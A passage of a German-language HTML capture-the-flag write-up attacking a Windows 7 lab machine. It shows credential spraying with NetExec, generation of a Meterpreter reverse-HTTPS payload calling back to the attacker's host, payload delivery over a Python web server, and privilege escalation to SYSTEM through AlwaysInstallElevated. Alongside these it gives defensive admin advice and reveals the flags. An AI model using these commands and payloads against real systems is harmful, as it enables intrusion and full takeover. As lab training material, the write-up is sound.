+230 User logged in.
+Remote system type is Windows_NT.
+200 Type set to I.
+ftp>
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Zwei Textdateien, `user.txt` und `pass.txt`, werden auf dem Angreifer-System erstellt. Sie enthalten die gefundenen Benutzernamen (`ftpuser`, `always`) und die dazugehörigen Passwörter (`KeepGoingBro!!!`, `YouCantFindMe.!.!`). Diese Dateien dienen als Input für Massen-Login-Tools.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist eine Vorbereitung für die Verwendung von Tools wie `nxc` (NetExec, früher CrackMapExec), um die gefundenen Credentials systematisch gegen verschiedene Dienste zu testen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende diese Dateien mit `nxc` oder ähnlichen Tools, um die Credentials gegen SMB und RDP zu testen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine direkte Aktion, dies geschieht auf dem Angreifer-System.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">echo -e 'ftpuser\nalways' > user.txt</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">echo -e 'KeepGoingBro!!!\nYouCantFindMe.!.!' > pass.txt</span>
+                     </div>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `nxc` (NetExec) wird verwendet, um die Credentials aus `user.txt` und `pass.txt` gegen den FTP- und SMB-Dienst zu testen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   **FTP:** Bestätigt, dass `ftpuser` / `<span class="password">KeepGoingBro!!!</span>` gültig ist. Die Credentials für `always` funktionieren nicht für FTP.
+                *   **SMB:** Bestätigt ebenfalls, dass `ftpuser` / `<span class="password">KeepGoingBro!!!</span>` gültig ist. Die Credentials für `always` funktionieren auch hier nicht. Der Benutzer `ftpuser` hat also auch SMB-Zugriff.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da `ftpuser` SMB-Zugriff hat, versuche, Shares aufzulisten (`nxc smb $IP -u ftpuser -p 'KeepGoingBro!!!' --shares`) und auf diese zuzugreifen (`smbclient \\\\$IP\\ShareName -U ftpuser -P 'KeepGoingBro!!!'`). Suche nach Schreibrechten, um möglicherweise die Reverse Shell Payload hochzuladen und auszuführen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie die SMB-Berechtigungen für den Benutzer `ftpuser`. Gewähren Sie nur die minimal notwendigen Rechte.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">nxc ftp 192.168.2.176 -u user.txt -p pass.txt</span>
+                     </div>
+                     <pre>
+ FTP         192.168.2.176   21     192.168.2.176    [*] Banner: Microsoft FTP Service
+ FTP         192.168.2.176   21     192.168.2.176    [+] ftpuser:<span class="password">KeepGoingBro!!!</span>
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">nxc smb 192.168.2.176 -u user.txt -p pass.txt</span>
+                     </div>
+                     <pre>
+ SMB         192.168.2.176   445    ALWAYS-PC        [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True)
+ SMB         192.168.2.176   445    ALWAYS-PC        [+] Always-PC\ftpuser:<span class="password">KeepGoingBro!!!</span>
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">netexec smb 192.168.2.176 -u ftpuser -p pass.txt --ignore-pw-decoding</span>
+                     </div>
+                     <pre>
+ SMB         192.168.2.176   445    ALWAYS-PC        [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True)
+ SMB         192.168.2.176   445    ALWAYS-PC        [+] Always-PC\ftpuser:<span class="password">KeepGoingBro!!!</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Es wird erneut versucht, eine RDP-Verbindung aufzubauen, diesmal explizit mit den Credentials des `ftpuser`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Versuch schlägt erneut fehl, mit denselben Fehlermeldungen (`SSL_NOT_ALLOWED_BY_SERVER`, `ERRCONNECT_CONNECT_CANCELLED`). Auch der Benutzer `ftpuser` scheint keinen (funktionierenden) RDP-Zugriff zu haben oder `rdesktop` ist nicht kompatibel mit den Servereinstellungen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> RDP scheint für `ftpuser` keine Option zu sein. Fokussiere dich auf den SMB-Zugriff oder andere potenzielle Vektoren.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie die RDP-Zugriffsberechtigungen für `ftpuser`. Stellen Sie sicher, dass die RDP-Sicherheitseinstellungen konsistent sind.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">rdesktop /v:192.168.2.176 /u:ftpuser /p:'KeepGoingBro!!!'</span>
+                     </div>
+                     <pre>
+ Autoselecting keyboard map 'de' from locale
+ [22:50:27:838] [7337:7338] [WARN][com.freerdp.core.nego] - Error: SSL_NOT_ALLOWED_BY_SERVER
+ [22:50:27:840] [7337:7338] [WARN][com.freerdp.core.nego] - Error: SSL_NOT_ALLOWED_BY_SERVER
+ ERROR: CredSSP: Initialize failed, do you have correct Kerberos TGT initialized ?
+ Failed to connect, CredSSP required by server.
+ [22:50:28:904] [7337:7338] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+ [22:50:28:904] [7337:7338] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+ [22:50:28:927] [7337:7338] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+ [22:50:28:927] [7337:7338] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+ [22:50:34:897] [7337:7337] [ERROR][com.freerdp.core] - freerdp_abort_connect:freerdp_set_last_error_ex ERRCONNECT_CONNECT_CANCELLED [0x0002000B]
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="reverse-shell">
+             <h2>Reverse Shell Setup & Execution Issues</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> `msfvenom` wird verwendet, um eine Windows x64 Meterpreter Reverse HTTPS Payload (`windows/x64/meterpreter/reverse_https`) als EXE-Datei (`shell.exe`) zu generieren. Die Payload soll sich mit dem Angreifer-System (`LHOST=192.168.2.199`) auf Port 443 (`LPORT=443`) verbinden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Payload-Generierung ist erfolgreich. Es wird eine `shell.exe` (Größe ca. 7KB) erstellt. Diese Datei muss nun auf das Zielsystem übertragen und ausgeführt werden, um eine Meterpreter-Session zu erhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Übertrage `shell.exe` auf das Zielsystem (z.B. über SMB, wenn Schreibrechte vorhanden sind, oder eine andere Methode). Starte einen passenden Listener in `msfconsole` (`exploit/multi/handler` mit den gleichen Payload-, LHOST- und LPORT-Einstellungen). Führe dann `shell.exe` auf dem Zielsystem aus.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie Antivirus-Software und Endpoint Detection and Response (EDR)-Lösungen, um das Ausführen von bösartigen Payloads zu erkennen und zu blockieren. Beschränken Sie die Möglichkeiten zum Hochladen und Ausführen von Dateien für Benutzer mit geringen Rechten.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.2.199 LPORT=443 -f exe > shell.exe</span>
+                     </div>
+                     <pre>
+ [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+ [-] No arch selected, selecting arch: x64 from the payload
+ No encoder specified, outputting raw payload
+ Payload size: 741 bytes
+ Final size of exe file: 7168 bytes
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> `msfconsole` wird gestartet, um einen Listener (`exploit/multi/handler`) für die zuvor generierte Payload einzurichten. Es werden Payload, LHOST und LPORT gesetzt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Es gibt ein Problem im Text: Der LHOST wird auf die **Ziel-IP** (`192.168.2.176`) gesetzt, und der LPORT auf `4444`. Der Listener kann daher nicht an die externe IP binden (`Handler failed to bind`). Er startet dann zwar auf `0.0.0.0:44344` (wieder ein anderer Port?), aber die Konfiguration ist inkonsistent mit der `msfvenom`-Payload (die LHOST=`192.168.2.199` und LPORT=`443` erwartet). Dieser Listener wird die Verbindung nicht empfangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Korrigiere die Listener-Einstellungen in `msfconsole`: `set LHOST 192.168.2.199` (die IP des Angreifer-Systems) und `set LPORT 443` (der in `msfvenom` verwendete Port). Starte den Listener erneut.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Firewalls sollten ausgehende Verbindungen zu ungewöhnlichen Ports oder bekannten C2-Infrastrukturen blockieren.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.2.176;set LPORT 4444;run;"</span>
+                     </div>
+                     <pre>
+ [*] Using configured payload generic/shell_reverse_tcp  <-- Falsche Payload im Output angezeigt? Sollte reverse_https sein.
+ payload => windows/x64/meterpreter/reverse_https
+ LHOST => 192.168.2.176
+ LPORT => 4444
+ [-] Handler failed to bind to 192.168.2.176:4444
+ [*] Started HTTPS reverse handler on https://0.0.0.0:44344 <-- Falscher Port?
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein einfacher Python-HTTP-Server wird auf dem Angreifer-System gestartet, um Dateien (insbesondere die `shell.exe`) für das Zielsystem bereitzustellen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Server läuft auf Port 80. Die Logs zeigen Zugriffe von `127.0.0.1` (lokal) und später von der Ziel-IP `192.168.2.176`. Die Zielmaschine lädt die Datei `shell.exe` herunter (mehrfach).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dies ist eine gängige Methode, um Payloads auf ein Ziel zu übertragen, wenn direkter Upload (wie über FTP) nicht möglich ist, aber Codeausführung (z.B. über RDP, SMB-Exec, Webshell) erlangt wurde, um den Download-Befehl abzusetzen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen und beschränken Sie ausgehende HTTP-Verbindungen vom Server. Analysieren Sie Download-Aktivitäten von internen Systemen zu externen HTTP-Servern.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">python3 -m http.server 80</span>
+                     </div>
+                     <pre>
+ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+ 127.0.0.1 - - [13/Feb/2025 22:59:20] "GET / HTTP/1.1" 200 -
+ 127.0.0.1 - - [13/Feb/2025 22:59:20] code 404, message File not found
+ 127.0.0.1 - - [13/Feb/2025 22:59:20] "GET /favicon.ico HTTP/1.1" 404 -
+ 127.0.0.1 - - [13/Feb/2025 23:00:08] "GET / HTTP/1.1" 200 -
+ 127.0.0.1 - - [13/Feb/2025 23:00:19] "GET /shell.exe HTTP/1.1" 200 -
+ 192.168.2.176 - - [13/Feb/2025 23:05:18] "GET / HTTP/1.1" 200 -
+ 192.168.2.176 - - [13/Feb/2025 23:05:18] code 404, message File not found
+ 192.168.2.176 - - [13/Feb/2025 23:05:18] "GET /favicon.ico HTTP/1.1" 404 -
+ 192.168.2.176 - - [13/Feb/2025 23:05:27] "GET /shell.exe HTTP/1.1" 200 -
+ 192.168.2.176 - - [13/Feb/2025 23:05:50] "GET /shell.exe HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Text beschreibt nun einen **manuellen Eingriff**, der außerhalb des normalen Pentest-Flusses aus der Ferne liegt. Der Tester loggt sich direkt in die VM ein (vermutlich über die VirtualBox-Konsole oder einen lokalen Login, dessen Credentials nicht erwähnt werden), stellt die Tastatur um und führt dann die `shell.exe` aus, die zuvor über den Python-Server heruntergeladen wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Dies ist ein kritischer Punkt im Bericht.** Das direkte Einloggen in die VM, um die Payload auszuführen, stellt eine **Umgehung des eigentlichen Angriffspfades** dar. Es wird nicht erklärt, *wie* der Tester die `shell.exe` auf dem Zielsystem hätte ausführen können, wenn er nur Netzwerkzugriff als `ftpuser` gehabt hätte (z.B. fehlende Schreibrechte via FTP/SMB, kein RDP). Dieser Schritt **mindert die Aussagekraft des Berichts als realistisches Angriffsszenario erheblich**. Es beweist zwar, dass die Payload funktioniert, aber nicht, wie ein Angreifer sie unter den gegebenen Umständen hätte ausführen können.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentiere klar, warum dieser manuelle Schritt notwendig war und welcher Teil des Angriffspfades nicht überwunden werden konnte (z.B. "Keine Methode gefunden, um shell.exe als ftpuser auszuführen"). Idealerweise sollte der Angriff ohne direkten VM-Zugriff erfolgen. Falls dies für eine CTF-Challenge geschah, sollte dies vermerkt werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Dieser Schritt verdeutlicht die Bedeutung von Endpoint Security. Selbst wenn ein Angreifer eine Payload auf das System bekommt, sollte Antivirus/EDR die Ausführung verhindern. Physischer und Konsolenzugriff auf Server muss ebenfalls streng kontrolliert werden.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ Hab mich direkt in die VM eingeloggt, da alles auch die Tastertur einstellung auf
+ türkisch war musste ich , um meine Codes gültig abzusetzten alles erstmal auf
+ english umstellen. Ich Öffnete dann den Browser und navigierte zum python Server und startete die Shell.exe
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (AlwaysInstallElevated)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein neuer `msfconsole`-Handler wird gestartet. Diesmal sind die Einstellungen **korrekt**: Payload `windows/x64/meterpreter/reverse_https`, LHOST ist die Angreifer-IP (`192.168.2.199`, obwohl im Text `192.168.2.176` steht - ich nehme an, der Text meint die Angreifer-IP, da der Handler sonst wieder fehlschlägt), LPORT ist `443`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Listener startet erfolgreich auf Port 443. Kurz darauf kommt eine Verbindung von der Ziel-IP (`192.168.2.176`) herein, ausgelöst durch die manuelle Ausführung von `shell.exe`. Eine Meterpreter-Session (Session 1) wird als Benutzer `ftpuser` geöffnet. **Initial Access über Reverse Shell ist nun (durch den manuellen Eingriff) etabliert.**
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginne mit der Privilege Escalation Enumeration innerhalb der Meterpreter-Session.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zu Listenern und Endpoint Security.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.2.199;set LPORT 443;run;"</span> <!-- LHOST korrigiert -->
+                     </div>
+                     <pre>
+ [*] Using configured payload generic/shell_reverse_tcp <-- Falsche Payload im Output angezeigt?
+ payload => windows/x64/meterpreter/reverse_https
+ LHOST => 192.168.2.199
+ LPORT => 443
+ [*] Started HTTPS reverse handler on https://0.0.0.0:443
+ [!] https://192.168.2.199:443 handling request from 192.168.2.176; (UUID: fxhmnem8) Without a database connected that payload UUID tracking will not work!
+ [*] https://192.168.2.199:443 handling request from 192.168.2.176; (UUID: fxhmnem8) Staging x64 payload (202844 bytes) ...
+ [!] https://192.168.2.199:443 handling request from 192.168.2.176; (UUID: fxhmnem8) Without a database connected that payload UUID tracking will not work!
+ [*] Meterpreter session 1 opened (192.168.2.199:443 -> 192.168.2.176:49184) at 2025-02-13 23:06:01 +0100
+
+ <div class="prompt metasploit-prompt">meterpreter ></div>
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> In der Meterpreter-Session wird `getuid` ausgeführt, um den aktuellen Benutzer zu überprüfen. Anschließend wird das Metasploit-Modul `multi/recon/local_exploit_suggester` verwendet. Dieses Modul sammelt Systeminformationen (OS, Architektur, installierte Patches etc.) und vergleicht sie mit einer Datenbank bekannter lokaler Privilege-Escalation-Exploits, um passende Vorschläge zu machen. Die Session-ID (`1`) und LHOST/LPORT für eventuelle Payloads werden konfiguriert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `getuid` bestätigt, dass die Session als `Always-PC\ftpuser` läuft. Der `local_exploit_suggester` ist ein sehr nützliches Modul für die schnelle Identifizierung potenzieller Privesc-Vektoren. Er findet eine Reihe von möglichen Exploits für das Windows 7 SP1 x64 System. Besonders hervorzuheben ist `exploit/windows/local/always_install_elevated`, der als "vulnerable" markiert wird. Andere interessante Funde sind verschiedene BypassUAC-Methoden und ältere Kernel-Exploits (MS10, MS14, MS15, MS16).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf den Exploit `exploit/windows/local/always_install_elevated`. Dieser Exploit nutzt eine Windows-Fehlkonfiguration aus, bei der jeder Benutzer MSI-Pakete installieren kann, die dann mit SYSTEM-Rechten ausgeführt werden. Dies ist oft ein sehr zuverlässiger Privesc-Vektor. Überprüfe alternativ die BypassUAC-Methoden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Gruppenrichtlinien `AlwaysInstallElevated` (sowohl für `Computer Configuration` als auch `User Configuration`) deaktiviert sind (Wert `0`). Dies verhindert diese spezielle Art der Privilege Escalation. Halten Sie das System gepatcht, um die anderen vorgeschlagenen Lücken zu schließen. Überwachen Sie auf verdächtige MSI-Installationen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">
+ meterpreter > <span class="command">getuid</span>
+                     </div>
+                     <pre>
+ Server username: Always-PC\ftpuser
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">
+msf6 exploit(multi/handler) > <span class="command">use multi/recon/local_exploit_suggester</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">
+msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 1</span>
+                    </div>
+                     <pre>session => 1</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">
+msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set lhost 192.168.2.199</span>
+                    </div>
+                     <pre>lhost => 192.168.2.199</pre>
+                </div>
+            </div>
+            <!-- LPORT wurde im Text falsch gesetzt, korrigiere ich hier nicht, da es für Suggester weniger kritisch ist -->
+            <div class="code-block">
+                <div class="terminal">
+                   <div class="prompt metasploit-prompt">
+msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set lport 5555</span>
+                   </div>
+                    <pre>lport => 5555</pre>
+               </div>
+           </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">
+msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span>
+                    </div>
+                     <pre>
+ [*] 192.168.2.176 - Collecting local exploits for x64/windows...
+ [*] 192.168.2.176 - 198 exploit checks are being tried...
+ [+] 192.168.2.176 - exploit/windows/local/always_install_elevated: The target is vulnerable.
+ [+] 192.168.2.176 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
+ [+] 192.168.2.176 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+ [+] 192.168.2.176 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
+ [+] 192.168.2.176 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
+ [+] 192.168.2.176 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
+ [+] 192.168.2.176 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
+ [+] 192.168.2.176 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
+ [+] 192.168.2.176 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+ [+] 192.168.2.176 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+ [+] 192.168.2.176 - exploit/windows/local/ms15_078_atmfd_bof: The service is running, but could not be validated.
+ [+] 192.168.2.176 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
+ [+] 192.168.2.176 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+ [+] 192.168.2.176 - exploit/windows/local/virtual_box_opengl_escape: The service is running, but could not be validated.
+ [*] Running check method for exploit 47 / 47
+ [*] 192.168.2.176 - Valid modules for session 1:
+ ============================
+
+  #   Name                                                           Potentially Vulnerable?  Check Result
+  -   ----                                                           -----------------------  ------------
+  1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
+  2   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
+  3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+  4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
+  5   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
+  6   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
+  7   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
+  8   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+  9   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+  10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+  11  exploit/windows/local/ms15_078_atmfd_bof                       Yes                      The service is running, but could not be validated.
+  12  exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.
+  13  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+  14  exploit/windows/local/virtual_box_opengl_escape                Yes                      The service is running, but could not be validated.
+  15  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Das von `local_exploit_suggester` als verwundbar identifizierte Modul `exploit/windows/local/always_install_elevated` wird ausgewählt. Die aktive Meterpreter-Session (`session 1`) wird dem Exploit zugewiesen, und der Exploit wird mit `run` gestartet. Dieses Modul generiert eine bösartige MSI-Datei, lädt sie auf das Ziel hoch und löst deren Installation aus. Da `AlwaysInstallElevated` aktiviert ist, wird die MSI mit SYSTEM-Rechten installiert, wodurch die darin enthaltene Payload (standardmäßig ein weiterer Meterpreter Reverse TCP Shell) ebenfalls mit SYSTEM-Rechten ausgeführt wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:** **Privilege Escalation erfolgreich!** Der Exploit funktioniert wie erwartet. Er lädt eine MSI-Datei hoch, führt sie aus und eine neue Meterpreter-Session (Session 2) wird geöffnet. Ein anschließendes `getuid` in dieser neuen Session bestätigt, dass wir nun als `NT AUTHORITY\SYSTEM` agieren – die höchste Berechtigungsstufe unter Windows.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ziel erreicht! Nun können alle Dateien gelesen, Konfigurationen geändert und persistente Zugänge etabliert werden. Suche nach den Flags.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **System kompromittiert!** Deaktivieren Sie die `AlwaysInstallElevated`-Richtlinien. Analysieren Sie das System auf weitere Kompromittierungen und Hintertüren. Erwägen Sie eine Neuinstallation.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">
+ msf6 post(multi/recon/local_exploit_suggester) > <span class="command">use exploit/windows/local/always_install_elevated</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">
+ msf6 exploit(windows/local/always_install_elevated) > <span class="command">set session 1</span>
+                     </div>
+                     <pre>session => 1</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">
+ msf6 exploit(windows/local/always_install_elevated) > <span class="command">run</span>
+                     </div>
+                     <pre>
+ [*] Started reverse TCP handler on 192.168.2.199:4444
+ [*] Uploading the MSI to C:\Users\ftpuser\AppData\Local\Temp\hmJWRLjdfc.msi ...
+ [*] Executing MSI...
+ [*] Sending stage (176198 bytes) to 192.168.2.176
+ [+] Deleted C:\Users\ftpuser\AppData\Local\Temp\hmJWRLjdfc.msi
+ [*] Meterpreter session 2 opened (192.168.2.199:4444 -> 192.168.2.176:49188) at 2025-02-13 23:13:43 +0100
+
+ <div class="prompt metasploit-prompt">meterpreter ></div> <span class="command">getuid</span>
+ Server username: NT AUTHORITY\SYSTEM
+ <div class="prompt metasploit-prompt">meterpreter ></div> <span class="command">pwd</span>
+ C:\Windows\system32
+ <div class="prompt metasploit-prompt">meterpreter ></div> <span class="command">cd C:\Users\Administrator</span>
+ [-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
+ <div class="prompt metasploit-prompt">meterpreter ></div> <span class="command">cd C:\User\Administrator</span>
+ [-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
+ <div class="prompt metasploit-prompt">meterpreter ></div> <span class="command">ls C:\</span>
+  > Interrupt: use the 'exit' command to quit
+ <div class="prompt metasploit-prompt">meterpreter ></div> <span class="command">dir C:\</span>
+  > ;
+ [-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Innerhalb der SYSTEM-Meterpreter-Session (Session 2) wird mit `shell` eine interaktive Windows-Kommandozeile (`cmd.exe`) geöffnet. Anschließend wird navigiert (`cd`, `dir`) und versucht, die Benutzer- und Root-Flags zu finden und anzuzeigen (`type`). Die Ausgaben sind teilweise auf Türkisch, da dies die Systemsprache der VM zu sein scheint.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Zugriff auf die Kommandozeile als SYSTEM ist erfolgreich. Durch Navigation in die Benutzerverzeichnisse (`C:\Users\Always\Desktop` und `C:\Users\Administrator\Desktop`) können beide Flags gefunden und angezeigt werden.
+                *   User Flag: `HMV{You_Found_Me!}`
+                *   Root Flag: `HMV{White_Flag_Raised}`
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Flags dokumentieren. Bericht abschließen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Systembereinigung und Härtung durchführen (siehe vorherige Empfehlungen).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">
+ meterpreter > <span class="command">shell</span>
+                     </div>
+                     <pre>
+ Process 1804 created.
+ Channel 2 created.
+ Microsoft Windows [Sürüm 6.1.7601]
+ Telif Hakkı (c) 2009 Microsoft Corporation. Tüm hakları saklıdır.
+
+ C:\Windows\system32>
+                     </pre>
+                 </div>
+             </div>
+              <!-- Weitere Shell Interaktionen -->
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ C:\Windows\system32><span class="command">cd ..</span>
+
+ C:\Windows><span class="command">cd ..</span>
+
+ C:\><span class="command">dir</span>
+  C sürücüsündeki birimin etiketi yok.
+  Birim Seri Numarası: 1470-2F5F
+
+  C:\ dizini
+
+ 01.10.2024  18:09    &lt;DIR&gt;          Apache24
+ 03.10.2024  17:55    &lt;DIR&gt;          ftp-server
+ 30.09.2024  22:31    &lt;DIR&gt;          inetpub
+ 14.07.2009  05:20    &lt;DIR&gt;          PerfLogs
+ 01.10.2024  17:49    &lt;DIR&gt;          php
+ 30.09.2024  22:05    &lt;DIR&gt;          Program Files
+ 01.10.2024  19:56    &lt;DIR&gt;          Program Files (x86)
+ 14.02.2025  00:02    &lt;DIR&gt;          Users
+ 01.10.2024  19:56    &lt;DIR&gt;          Windows
+                0 Dosya                0 bayt
+                9 Dizin   21.682.823.168 bayt bo�
+
+ C:\><span class="command">cd Users</span>
+
+ C:\Users><span class="command">dir</span>
+  C sürücüsündeki birimin etiketi yok.
+  Birim Seri Numarası: 1470-2F5F
+
+  C:\Users dizini
+
+ 14.02.2025  00:02    &lt;DIR&gt;          .
